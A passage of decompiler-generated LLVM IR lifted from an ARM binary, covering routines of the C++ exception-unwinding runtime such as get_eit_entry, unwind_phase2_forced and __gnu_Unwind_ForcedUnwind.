  %v3_18118 = inttoptr i32 %v2_18118 to i32*
  store i32 %v2_1810c, i32* %v3_18118, align 4
  ret i32 0

dec_label_pc_18120:                               ; preds = %entry
  %tmp11 = icmp ult i32 %regclass, 5
  br i1 %tmp11, label %bb9, label %bb10

bb9:                                              ; preds = %dec_label_pc_18120
  br label %bb10

bb10:                                             ; preds = %dec_label_pc_18120, %bb9
  %v0_18128 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %tmp11, i32 %v0_18128)
  br label %dec_label_pc_1812c

dec_label_pc_1812c:                               ; preds = %bb8, %.thread3, %bb10
  ret i32 2

; uselistorder directives
  uselistorder i32 %regno, { 1, 0 }
  uselistorder label %dec_label_pc_1812c, { 2, 0, 1 }
  uselistorder label %bb10, { 1, 0 }
}

define i32 @_Unwind_GetCFA(i32 %context) local_unnamed_addr {
entry:
  %v1_18134 = add i32 %context, 68
  %v2_18134 = inttoptr i32 %v1_18134 to i32*
  %v3_18134 = load i32, i32* %v2_18134, align 4
  ret i32 %v3_18134

; uselistorder directives
  uselistorder i32 68, { 10, 8, 0, 9, 1, 3, 4, 5, 6, 2, 7 }
}

define void @_Unwind_Complete(i32 %ucbp) local_unnamed_addr {
entry:
  ret void
}

define void @_Unwind_DeleteException(i32 %exc) local_unnamed_addr {
entry:
  %v1_18144 = add i32 %exc, 8
  %v2_18144 = inttoptr i32 %v1_18144 to i32*
  %v3_18144 = load i32, i32* %v2_18144, align 4
  %v2_18148 = icmp eq i32 %v3_18144, 0
  br i1 %v2_18148, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v2_1815c = xor i1 %v2_18148, true
  call void @__pseudo_cond_branch(i1 %v2_1815c, i32 %v3_18144)
  ret void

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @_Unwind_GetTextRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_18174 = call i32 @abort()
  ret i32 %v0_18174
}

; Function Attrs: noreturn
define i32 @_Unwind_GetDataRelBase(i32 %context) local_unnamed_addr #0 {
entry:
  %v0_18180 = call i32 @abort()
  ret i32 %v0_18180
}

define i32 @get_eit_entry(i32 %ucbp, i32 %return_address) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v3_18184 = load i32, i32* @r4, align 4
  store i32 %v3_18184, i32* %stack_var_-32, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r5.global-to-local, align 4
  %v4_18194 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 132) to i32*), align 4
  %v2_18198 = icmp eq i32 %v4_18194, 0
  store i32 %ucbp, i32* %r6.global-to-local, align 4
  %v1_181a4 = add i32 %return_address, -2
  store i32 %v1_181a4, i32* %r4.global-to-local, align 4
  br i1 %v2_18198, label %dec_label_pc_181dc, label %dec_label_pc_181ac

dec_label_pc_181ac:                               ; preds = %entry
  call void @__pseudo_branch(i32 %v4_18194)
  %v2_181bc = icmp eq i32 %v1_181a4, 0
  br i1 %v2_181bc, label %.thread, label %dec_label_pc_181fcthread-pre-split

.thread:                                          ; preds = %dec_label_pc_181ac
  store i32 9, i32* %r2.global-to-local, align 4
  %v2_181c4 = load i32, i32* %r6.global-to-local, align 4
  %v3_181c4 = add i32 %v2_181c4, 16
  %v4_181c4 = inttoptr i32 %v3_181c4 to i32*
  store i32 0, i32* %v4_181c4, align 4
  br label %dec_label_pc_181cc

dec_label_pc_181cc:                               ; preds = %.thread, %.thread10, %dec_label_pc_18374, %dec_label_pc_18360, %dec_label_pc_1833c, %dec_label_pc_18314, %dec_label_pc_18214
  %v0_181cc = load i32, i32* %r2.global-to-local, align 4
  %v2_181d4 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_181d4, i32* @r4, align 4
  ret i32 %v0_181cc

dec_label_pc_181dc:                               ; preds = %entry
  store i32 20, i32* %r2.global-to-local, align 4
  %v4_181e4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 20) to i32*), align 4
  %v4_181e8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 48) to i32*), align 4
  store i32 %v4_181e8, i32* %r2.global-to-local, align 4
  %v2_181ec = sub i32 %v4_181e4, %v4_181e8
  %v3_181f0 = sdiv i32 %v2_181ec, 8
  store i32 %v3_181f0, i32* %stack_var_-36, align 4
  br label %dec_label_pc_181fc

dec_label_pc_181fcthread-pre-split:               ; preds = %dec_label_pc_181ac
  %v3_181fc.pr = load i32, i32* %stack_var_-36, align 4
  br label %dec_label_pc_181fc

dec_label_pc_181fc:                               ; preds = %dec_label_pc_181fcthread-pre-split, %dec_label_pc_181dc
  %v0_18240.pre = phi i32 [ %v1_181a4, %dec_label_pc_181fcthread-pre-split ], [ %v4_181e8, %dec_label_pc_181dc ]
  %v1_18204 = phi i32 [ %v3_181fc.pr, %dec_label_pc_181fcthread-pre-split ], [ %v3_181f0, %dec_label_pc_181dc ]
  %v2_18200 = icmp eq i32 %v1_18204, 0
  br i1 %v2_18200, label %dec_label_pc_18214, label %dec_label_pc_18230.preheader

dec_label_pc_18230.preheader:                     ; preds = %dec_label_pc_181fc
  %v2_18204 = add i32 %v1_18204, -1
  %v1_18260 = add i32 %v0_18240.pre, 8
  br label %dec_label_pc_18230.outer

dec_label_pc_18214.loopexit:                      ; preds = %dec_label_pc_1828c
  br label %dec_label_pc_18214

dec_label_pc_18214:                               ; preds = %dec_label_pc_18214.loopexit, %dec_label_pc_181fc, %dec_label_pc_18358
  store i32 9, i32* %r2.global-to-local, align 4
  %v1_1821c = load i32, i32* %r6.global-to-local, align 4
  %v2_1821c = add i32 %v1_1821c, 16
  %v3_1821c = inttoptr i32 %v2_1821c to i32*
  store i32 0, i32* %v3_1821c, align 4
  br label %dec_label_pc_181cc

dec_label_pc_18224:                               ; preds = %dec_label_pc_18280
  %v3_18224 = icmp ult i32 %storemerge40, %v0_18284
  br i1 %v3_18224, label %dec_label_pc_1822c, label %dec_label_pc_1829c

dec_label_pc_1822c:                               ; preds = %dec_label_pc_18224
  %v1_1822c = add nsw i32 %v3_18238, 1
  br label %dec_label_pc_18230.outer

dec_label_pc_18230.outer:                         ; preds = %dec_label_pc_1822c, %dec_label_pc_18230.preheader
  %v1_1828c.ph = phi i32 [ %v1_1822c, %dec_label_pc_1822c ], [ 0, %dec_label_pc_18230.preheader ]
  %v0_18230.ph = phi i32 [ %v0_18230, %dec_label_pc_1822c ], [ %v2_18204, %dec_label_pc_18230.preheader ]
  br label %dec_label_pc_18230

dec_label_pc_18230:                               ; preds = %dec_label_pc_18230.outer, %dec_label_pc_18294
  %v0_18230 = phi i32 [ %v1_18294, %dec_label_pc_18294 ], [ %v0_18230.ph, %dec_label_pc_18230.outer ]
  %v2_18230 = add i32 %v0_18230, %v1_1828c.ph
  %tmp = icmp slt i32 %v2_18230, 0
  %v4_18234 = zext i1 %tmp to i32
  %v5_18234 = add i32 %v4_18234, %v2_18230
  %v3_18238 = sdiv i32 %v5_18234, 2
  %v3_1823c = mul i32 %v3_18238, 8
  store i32 %v3_1823c, i32* @ip, align 4
  %v2_18240 = add i32 %v3_1823c, %v0_18240.pre
  %v3_18240 = inttoptr i32 %v2_18240 to i32*
  %v4_18240 = load i32, i32* %v3_18240, align 4
  %v1_18244 = and i32 %v4_18240, 1073741824
  %v2_18244 = icmp eq i32 %v1_18244, 0
  %v2_18248 = or i32 %v4_18240, -2147483648
  %tmp79 = bitcast i32 %v4_18240 to float
  %tmp80 = call float @fabsf(float %tmp79)
  %v2_1824c = bitcast float %tmp80 to i32
  %storemerge = select i1 %v2_18244, i32 %v2_1824c, i32 %v2_18248
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v9_18250 = icmp eq i32 %v2_18204, %v3_18238
  store i32 %v2_18240, i32* %r7.global-to-local, align 4
  br i1 %v9_18250, label %dec_label_pc_18280, label %dec_label_pc_18260

dec_label_pc_18260:                               ; preds = %dec_label_pc_18230
  %v2_18264 = add i32 %v3_1823c, %v1_18260
  %v3_18264 = inttoptr i32 %v2_18264 to i32*
  %v4_18264 = load i32, i32* %v3_18264, align 4
  %v1_1826c = and i32 %v4_18264, 1073741824
  %v2_1826c = icmp eq i32 %v1_1826c, 0
  %v2_18270 = or i32 %v4_18264, -2147483648
  %tmp81 = bitcast i32 %v4_18264 to float
  %tmp82 = call float @fabsf(float %tmp81)
  %v2_18274 = bitcast float %tmp82 to i32
  %storemerge39 = select i1 %v2_1826c, i32 %v2_18274, i32 %v2_18270
  %v1_18278 = add i32 %v2_18264, -1
  %v2_1827c = add i32 %storemerge39, %v1_18278
  br label %dec_label_pc_18280

dec_label_pc_18280:                               ; preds = %dec_label_pc_18230, %dec_label_pc_18260
  %storemerge40 = phi i32 [ %v2_1827c, %dec_label_pc_18260 ], [ -1, %dec_label_pc_18230 ]
  %v2_18280 = add i32 %storemerge, %v2_18240
  %v0_18284 = load i32, i32* %r4.global-to-local, align 4
  %v3_18284 = icmp ult i32 %v0_18284, %v2_18280
  br i1 %v3_18284, label %dec_label_pc_1828c, label %dec_label_pc_18224

dec_label_pc_1828c:                               ; preds = %dec_label_pc_18280
  %v9_1828c = icmp eq i32 %v3_18238, %v1_1828c.ph
  br i1 %v9_1828c, label %dec_label_pc_18214.loopexit, label %dec_label_pc_18294

dec_label_pc_18294:                               ; preds = %dec_label_pc_1828c
  %v1_18294 = add nsw i32 %v3_18238, -1
  br label %dec_label_pc_18230

dec_label_pc_1829c:                               ; preds = %dec_label_pc_18224
  %v2_1829c = load i32, i32* %v3_18240, align 4
  %v1_182a0 = and i32 %v2_1829c, 1073741824
  %v2_182a0 = icmp eq i32 %v1_182a0, 0
  %v2_182a4 = or i32 %v2_1829c, -2147483648
  %tmp83 = bitcast i32 %v2_1829c to float
  %tmp84 = call float @fabsf(float %tmp83)
  %v2_182a8 = bitcast float %tmp84 to i32
  %v0_182ac = select i1 %v2_182a0, i32 %v2_182a8, i32 %v2_182a4
  %v2_182ac = add i32 %v0_182ac, %v2_18240
  %v1_182b0 = load i32, i32* %r6.global-to-local, align 4
  %v2_182b0 = add i32 %v1_182b0, 72
  %v3_182b0 = inttoptr i32 %v2_182b0 to i32*
  store i32 %v2_182ac, i32* %v3_182b0, align 4
  %v0_182b4 = load i32, i32* %r7.global-to-local, align 4
  %v1_182b4 = add i32 %v0_182b4, 4
  %v2_182b4 = inttoptr i32 %v1_182b4 to i32*
  %v3_182b4 = load i32, i32* %v2_182b4, align 4
  %v7_182b8 = icmp eq i32 %v3_182b4, 1
  br i1 %v7_182b8, label %.thread10, label %dec_label_pc_182cc

.thread10:                                        ; preds = %dec_label_pc_1829c
  %v1_182b8 = add i32 %v3_182b4, -1
  store i32 5, i32* %r2.global-to-local, align 4
  %v2_182c4 = load i32, i32* %r6.global-to-local, align 4
  %v3_182c4 = add i32 %v2_182c4, 16
  %v4_182c4 = inttoptr i32 %v3_182c4 to i32*
  store i32 %v1_182b8, i32* %v4_182c4, align 4
  br label %dec_label_pc_181cc

dec_label_pc_182cc:                               ; preds = %dec_label_pc_1829c
  %v1_182cc = icmp slt i32 %v3_182b4, 0
  br i1 %v1_182cc, label %.thread38, label %dec_label_pc_182e4

.thread38:                                        ; preds = %dec_label_pc_182cc
  store i32 1, i32* %r2.global-to-local, align 4
  %v4_182d8 = load i32, i32* %r6.global-to-local, align 4
  %v5_182d8 = add i32 %v4_182d8, 76
  %v6_182d8 = inttoptr i32 %v5_182d8 to i32*
  store i32 %v1_182b4, i32* %v6_182d8, align 4
  %v3_182dc = load i32, i32* %r2.global-to-local, align 4
  %v4_182dc = load i32, i32* %r6.global-to-local, align 4
  %v5_182dc = add i32 %v4_182dc, 80
  %v6_182dc = inttoptr i32 %v5_182dc to i32*
  store i32 %v3_182dc, i32* %v6_182dc, align 4
  br label %dec_label_pc_18304

dec_label_pc_182e4:                               ; preds = %dec_label_pc_182cc
  %v1_182e4 = and i32 %v3_182b4, 1073741824
  %v2_182e4 = icmp eq i32 %v1_182e4, 0
  %v2_182e8 = or i32 %v3_182b4, -2147483648
  %tmp85 = bitcast i32 %v3_182b4 to float
  %tmp86 = call float @fabsf(float %tmp85)
  %v2_182ec = bitcast float %tmp86 to i32
  %storemerge42 = select i1 %v2_182e4, i32 %v2_182ec, i32 %v2_182e8
  %v1_182f0 = add i32 %storemerge42, 4
  %v2_182f4 = add i32 %v1_182f0, %v0_182b4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_182fc = load i32, i32* %r6.global-to-local, align 4
  %v2_182fc = add i32 %v1_182fc, 76
  %v3_182fc = inttoptr i32 %v2_182fc to i32*
  store i32 %v2_182f4, i32* %v3_182fc, align 4
  %v0_18300 = load i32, i32* %r2.global-to-local, align 4
  %v1_18300 = load i32, i32* %r6.global-to-local, align 4
  %v2_18300 = add i32 %v1_18300, 80
  %v3_18300 = inttoptr i32 %v2_18300 to i32*
  store i32 %v0_18300, i32* %v3_18300, align 4
  br label %dec_label_pc_18304

dec_label_pc_18304:                               ; preds = %.thread38, %dec_label_pc_182e4
  %v0_18304 = load i32, i32* %r6.global-to-local, align 4
  %v1_18304 = add i32 %v0_18304, 76
  %v2_18304 = inttoptr i32 %v1_18304 to i32*
  %v3_18304 = load i32, i32* %v2_18304, align 4
  store i32 %v3_18304, i32* %r2.global-to-local, align 4
  %v1_18308 = inttoptr i32 %v3_18304 to i32*
  %v2_18308 = load i32, i32* %v1_18308, align 4
  %v1_1830c = icmp slt i32 %v2_18308, 0
  br i1 %v1_1830c, label %dec_label_pc_18330, label %dec_label_pc_18314

dec_label_pc_18314:                               ; preds = %dec_label_pc_18304
  %v1_18314 = and i32 %v2_18308, 1073741824
  %v2_18314 = icmp eq i32 %v1_18314, 0
  %v2_18318 = or i32 %v2_18308, -2147483648
  %tmp87 = bitcast i32 %v2_18308 to float
  %tmp88 = call float @fabsf(float %tmp87)
  %v2_1831c = bitcast float %tmp88 to i32
  %v0_18320 = select i1 %v2_18314, i32 %v2_1831c, i32 %v2_18318
  %v2_18320 = add i32 %v0_18320, %v3_18304
  store i32 0, i32* %r2.global-to-local, align 4
  %v2_18328 = add i32 %v0_18304, 16
  %v3_18328 = inttoptr i32 %v2_18328 to i32*
  store i32 %v2_18320, i32* %v3_18328, align 4
  br label %dec_label_pc_181cc

dec_label_pc_18330:                               ; preds = %dec_label_pc_18304
  %v3_18330 = udiv i32 %v2_18308, 16777216
  %v1_18334 = urem i32 %v3_18330, 16
  %v2_18334 = icmp eq i32 %v1_18334, 0
  br i1 %v2_18334, label %dec_label_pc_1833c, label %dec_label_pc_18350

dec_label_pc_1833c:                               ; preds = %dec_label_pc_18330
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18344 = load i32, i32* %r5.global-to-local, align 4
  %v2_18344 = add i32 %v0_18344, -36800
  %v2_18348 = add i32 %v0_18304, 16
  %v3_18348 = inttoptr i32 %v2_18348 to i32*
  store i32 %v2_18344, i32* %v3_18348, align 4
  br label %dec_label_pc_181cc

dec_label_pc_18350:                               ; preds = %dec_label_pc_18330
  %v7_18350 = icmp eq i32 %v1_18334, 1
  br i1 %v7_18350, label %dec_label_pc_18374, label %dec_label_pc_18358

dec_label_pc_18358:                               ; preds = %dec_label_pc_18350
  %v7_18358 = icmp eq i32 %v1_18334, 2
  br i1 %v7_18358, label %dec_label_pc_18360, label %dec_label_pc_18214

dec_label_pc_18360:                               ; preds = %dec_label_pc_18358
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_18368 = load i32, i32* %r5.global-to-local, align 4
  %v2_18368 = add i32 %v0_18368, -36816
  %v2_1836c = add i32 %v0_18304, 16
  %v3_1836c = inttoptr i32 %v2_1836c to i32*
  store i32 %v2_18368, i32* %v3_1836c, align 4
  br label %dec_label_pc_181cc

dec_label_pc_18374:                               ; preds = %dec_label_pc_18350
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_1837c = load i32, i32* %r5.global-to-local, align 4
  %v2_1837c = add i32 %v0_1837c, -36808
  %v2_18380 = add i32 %v0_18304, 16
  %v3_18380 = inttoptr i32 %v2_18380 to i32*
  store i32 %v2_1837c, i32* %v3_18380, align 4
  br label %dec_label_pc_181cc

; uselistorder directives
  uselistorder i32 %v1_18334, { 2, 1, 0 }
  uselistorder i32 %v0_18304, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_182b4, { 0, 2, 1, 3, 5, 4 }
  uselistorder i32 %v0_18284, { 1, 0 }
  uselistorder i32 %v3_1823c, { 2, 1, 0 }
  uselistorder i32 %v3_18238, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_18230, { 1, 0 }
  uselistorder i32 %v0_18230, { 1, 0 }
  uselistorder i32 %v2_18204, { 1, 0 }
  uselistorder i32 %v0_18240.pre, { 1, 0 }
  uselistorder i32 %v3_181f0, { 1, 0 }
  uselistorder i32 %v1_181a4, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 15, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 10, 11, 12, 14, 13 }
  uselistorder i32 132, { 0, 3, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_18304, { 1, 0 }
  uselistorder label %dec_label_pc_18280, { 1, 0 }
  uselistorder label %dec_label_pc_18230, { 1, 0 }
  uselistorder label %dec_label_pc_18214, { 2, 0, 1 }
  uselistorder label %dec_label_pc_181cc, { 2, 3, 4, 5, 1, 6, 0 }
}

define i32 @function_1838c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1838c:
  %v0_1838c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1838c, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_1838c
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_1838c, %bb
  %v10_18394 = phi i32 [ %arg1, %dec_label_pc_1838c ], [ 0, %bb ]
  ret i32 %v10_18394

; uselistorder directives
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @unwind_phase2_forced(i32 %ucbp, i32 %entry_vrs, i32 %resuming) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %next_vrs_-648 = alloca i32, align 4
  %saved_vrs_-344 = alloca i32, align 4
  %stack_var_-292 = alloca i32, align 4
  %v1_183a8 = add i32 %entry_vrs, 4
  store i32 %ucbp, i32* @r5, align 4
  store i32 %resuming, i32* @r6, align 4
  %v1_183bc = inttoptr i32 %v1_183a8 to i32*
  %v2_183bc = load i32, i32* %v1_183bc, align 4
  store i32 %v2_183bc, i32* %r0.global-to-local, align 4
  %v12_183bc = add i32 %entry_vrs, 20
  %v1_183c8 = inttoptr i32 %v12_183bc to i32*
  %v2_183c8 = load i32, i32* %v1_183c8, align 4
  store i32 %v2_183c8, i32* %r0.global-to-local, align 4
  %v12_183c8 = add i32 %entry_vrs, 36
  %v1_183d0 = inttoptr i32 %v12_183c8 to i32*
  %v2_183d0 = load i32, i32* %v1_183d0, align 4
  store i32 %v2_183d0, i32* %r0.global-to-local, align 4
  %v12_183d0 = add i32 %entry_vrs, 52
  store i32 %v12_183d0, i32* @ip, align 4
  %v13_183d4 = ptrtoint i32* %stack_var_-292 to i32
  store i32 %v13_183d4, i32* @lr, align 4
  %v1_183d8 = inttoptr i32 %v12_183d0 to i32*
  %v2_183d8 = load i32, i32* %v1_183d8, align 4
  store i32 %v2_183d8, i32* %r0.global-to-local, align 4
  %v9_183d8 = add i32 %entry_vrs, 64
  %v10_183d8 = inttoptr i32 %v9_183d8 to i32*
  %v11_183d8 = load i32, i32* %v10_183d8, align 4
  store i32 0, i32* @r4, align 4
  %v1_183e0 = add i32 %ucbp, 12
  %v2_183e0 = inttoptr i32 %v1_183e0 to i32*
  %v3_183e0 = load i32, i32* %v2_183e0, align 4
  store i32 %v2_183d8, i32* %stack_var_-292, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 0, i32* %saved_vrs_-344, align 4
  %v2_183f8 = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_183d8)
  store i32 %v2_183f8, i32* %r0.global-to-local, align 4
  %v0_183fc = load i32, i32* @r6, align 4
  %v1_183fc = load i32, i32* @r4, align 4
  %v9_183fc = icmp eq i32 %v0_183fc, %v1_183fc
  store i32 %v2_183f8, i32* @r7, align 4
  %.pre = ptrtoint i32* %saved_vrs_-344 to i32
  br i1 %v9_183fc, label %dec_label_pc_18410, label %.thread

.thread:                                          ; preds = %entry
  br label %dec_label_pc_1841c

dec_label_pc_18410:                               ; preds = %entry
  store i32 %v0_183fc, i32* @r4, align 4
  br label %dec_label_pc_18418

dec_label_pc_18418:                               ; preds = %dec_label_pc_184e0, %dec_label_pc_18410
  br label %dec_label_pc_1841c

dec_label_pc_1841c:                               ; preds = %.thread, %dec_label_pc_18418
  %storemerge = phi i32 [ 10, %.thread ], [ 9, %dec_label_pc_18418 ]
  store i32 %storemerge, i32* @r6, align 4
  %v2_1841c = icmp eq i32 %v2_183f8, 0
  br i1 %v2_1841c, label %dec_label_pc_18494, label %.thread2.dec_label_pc_18430_crit_edge

.thread2.dec_label_pc_18430_crit_edge:            ; preds = %dec_label_pc_1841c
  br label %dec_label_pc_18430

dec_label_pc_18430:                               ; preds = %.thread2.dec_label_pc_18430_crit_edge, %dec_label_pc_18494
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_18440 = load i32, i32* @r5, align 4
  store i32 %v0_18440, i32* @r3, align 4
  store i32 99408, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_183e0)
  br i1 false, label %dec_label_pc_18458, label %dec_label_pc_18480

dec_label_pc_18458:                               ; preds = %dec_label_pc_18430
  br i1 undef, label %dec_label_pc_18460, label %dec_label_pc_18484

dec_label_pc_18460:                               ; preds = %dec_label_pc_18458
  br i1 undef, label %dec_label_pc_184e0, label %dec_label_pc_18478

dec_label_pc_18478:                               ; preds = %dec_label_pc_18460
  br i1 undef, label %dec_label_pc_184d8, label %dec_label_pc_18480

dec_label_pc_18480:                               ; preds = %dec_label_pc_18430, %dec_label_pc_18478
  br label %dec_label_pc_18484

dec_label_pc_18484:                               ; preds = %dec_label_pc_18458, %dec_label_pc_18480
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_18494:                               ; preds = %dec_label_pc_1841c
  store i32 %v11_183d8, i32* @r3, align 4
  %v2_18498 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_18498, i32* @r4, align 4
  %v1_1849c = load i32, i32* @r5, align 4
  %v2_1849c = add i32 %v1_1849c, 20
  %v3_1849c = inttoptr i32 %v2_1849c to i32*
  store i32 %v11_183d8, i32* %v3_1849c, align 4
  store i32 %v2_18498, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_184ac = call i32 @memcpy()
  %v0_184b4 = load i32, i32* @r6, align 4
  store i32 %v0_184b4, i32* %r0.global-to-local, align 4
  %v0_184b8 = load i32, i32* @r5, align 4
  %v1_184bc = add i32 %v0_184b8, 16
  %v2_184bc = inttoptr i32 %v1_184bc to i32*
  %v3_184bc = load i32, i32* %v2_184bc, align 4
  store i32 %v3_184bc, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_184bc)
  %v0_184cc = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_184cc, i32* @r4, align 4
  br label %dec_label_pc_18430

dec_label_pc_184d8:                               ; preds = %dec_label_pc_18478
  br label %dec_label_pc_184e0

dec_label_pc_184e0:                               ; preds = %dec_label_pc_18460, %dec_label_pc_184d8
  br label %dec_label_pc_18418

; uselistorder directives
  uselistorder i32 %v11_183d8, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
  uselistorder i32* @r3, { 101, 102, 40, 41, 29, 103, 104, 32, 105, 106, 3, 107, 108, 109, 4, 110, 111, 112, 5, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 0, 131, 132, 133, 134, 30, 31, 33, 34, 35, 36, 37, 38, 39, 85, 60, 61, 62, 135, 136, 149, 150, 151, 139, 140, 141, 142, 143, 1, 144, 6, 43, 44, 137, 138, 56, 57, 98, 99, 100, 95, 96, 91, 92, 94, 93, 9, 10, 11, 155, 152, 153, 154, 2, 156, 157, 158, 42, 45, 46, 47, 48, 49, 50, 145, 146, 147, 148, 69, 70, 71, 72, 63, 64, 65, 8, 73, 74, 75, 76, 77, 24, 25, 26, 27, 12, 18, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 28, 51, 52, 53, 97, 54, 55, 58, 59, 66, 7, 67, 68, 78, 79, 80, 81, 82, 83, 84, 86, 87, 88, 89, 90 }
  uselistorder i32 10, { 4, 5, 28, 29, 30, 8, 41, 40, 73, 0, 37, 38, 72, 42, 43, 1, 32, 27, 10, 26, 11, 12, 13, 23, 6, 33, 24, 14, 3, 25, 34, 15, 35, 36, 31, 16, 17, 18, 39, 9, 44, 45, 2, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 19, 57, 58, 59, 20, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 7, 70, 21, 71, 22 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_184e0, { 1, 0 }
  uselistorder label %dec_label_pc_18484, { 1, 0 }
  uselistorder label %dec_label_pc_18480, { 1, 0 }
  uselistorder label %dec_label_pc_18430, { 1, 0 }
  uselistorder label %dec_label_pc_1841c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_184f4 = add i32 %ucbp, 12
  %v3_184f4 = inttoptr i32 %v2_184f4 to i32*
  store i32 %stop_fn, i32* %v3_184f4, align 4
  %v3_184f8 = add i32 %ucbp, 24
  %v4_184f8 = inttoptr i32 %v3_184f8 to i32*
  store i32 %tmp, i32* %v4_184f8, align 4
  %v1_184fc = add i32 %entry_vrs, 60
  %v2_184fc = inttoptr i32 %v1_184fc to i32*
  %v3_184fc = load i32, i32* %v2_184fc, align 4
  %v2_18504 = add i32 %entry_vrs, 64
  %v3_18504 = inttoptr i32 %v2_18504 to i32*
  store i32 %v3_184fc, i32* %v3_18504, align 4
  %v3_1850c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1850c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_185246 = add i32 %vrs, 64
  %v2_185247 = inttoptr i32 %v1_185246 to i32*
  %v3_185248 = load i32, i32* %v2_185247, align 4
  %v2_185289 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_185248)
  store i32 %v2_185289, i32* %r0.global-to-local, align 4
  %v2_1852c11 = icmp eq i32 %v2_185289, 0
  br i1 %v2_1852c11, label %dec_label_pc_18534, label %dec_label_pc_18564

dec_label_pc_18534:                               ; preds = %entry, %dec_label_pc_18534.dec_label_pc_18520_crit_edge
  %v0_18534 = load i32, i32* @r5, align 4
  %v1_18534 = add i32 %v0_18534, 64
  %v2_18534 = inttoptr i32 %v1_18534 to i32*
  %v3_18534 = load i32, i32* %v2_18534, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_1853c = load i32, i32* @r4, align 4
  %v2_1853c = add i32 %v1_1853c, 20
  %v3_1853c = inttoptr i32 %v2_1853c to i32*
  store i32 %v3_18534, i32* %v3_1853c, align 4
  %v0_18540 = load i32, i32* @r4, align 4
  %v1_18548 = add i32 %v0_18540, 16
  %v2_18548 = inttoptr i32 %v1_18548 to i32*
  %v3_18548 = load i32, i32* %v2_18548, align 4
  call void @__pseudo_branch(i32 %v3_18548)
  %v0_18554 = load i32, i32* %r0.global-to-local, align 4
  %v7_18554 = icmp eq i32 %v0_18554, 8
  br i1 %v7_18554, label %dec_label_pc_18534.dec_label_pc_18520_crit_edge, label %dec_label_pc_1855c

dec_label_pc_18534.dec_label_pc_18520_crit_edge:  ; preds = %dec_label_pc_18534
  %v0_18520.pre = load i32, i32* @r4, align 4
  %v0_18524.pre = load i32, i32* @r5, align 4
  store i32 %v0_18520.pre, i32* %r0.global-to-local, align 4
  %v1_18524 = add i32 %v0_18524.pre, 64
  %v2_18524 = inttoptr i32 %v1_18524 to i32*
  %v3_18524 = load i32, i32* %v2_18524, align 4
  %v2_18528 = call i32 @get_eit_entry(i32 %v0_18520.pre, i32 %v3_18524)
  store i32 %v2_18528, i32* %r0.global-to-local, align 4
  %v2_1852c = icmp eq i32 %v2_18528, 0
  br i1 %v2_1852c, label %dec_label_pc_18534, label %dec_label_pc_18564

dec_label_pc_1855c:                               ; preds = %dec_label_pc_18534
  %v7_1855c = icmp eq i32 %v0_18554, 7
